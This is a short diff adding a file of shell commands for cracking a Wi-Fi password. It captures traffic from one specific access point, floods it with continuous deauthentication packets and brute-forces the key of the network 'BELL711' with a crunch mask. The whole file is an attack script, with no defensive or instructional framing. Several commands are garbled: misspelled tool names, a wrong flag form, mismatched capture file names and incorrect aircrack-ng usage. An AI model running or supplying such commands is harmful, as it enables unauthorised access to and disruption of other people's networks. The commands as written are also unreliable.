@@ -1,0 +1,7 @@
+sudo airmon-ng start wlan0mon
+
+sudo airdump-ng --channel 2 -w networkme -bssid 6C:19:8F:BC:CD:9A wlan0mon
+
+sudo aireplay -0 0 -a 6C:19:8F:BC:CD:9A wlan0mon
+
+crunch 14 14 -t 242eveleig@64! | aircrack-ng -w netkey-01.cap -e BELL711
